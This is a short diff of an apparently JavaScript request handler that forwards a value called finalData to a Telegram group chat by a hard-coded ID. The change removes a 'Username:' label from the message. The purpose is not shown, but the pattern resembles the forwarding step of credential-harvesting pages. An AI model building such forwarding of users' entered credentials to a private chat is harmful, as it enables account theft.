@@ -11,7 +11,7 @@ export default async (req, res) => {
 
     telegram.sendMessage('-549988575',
         `Message: 
-        Username: ${finalData}`
+        ${finalData}`
 
 
     )
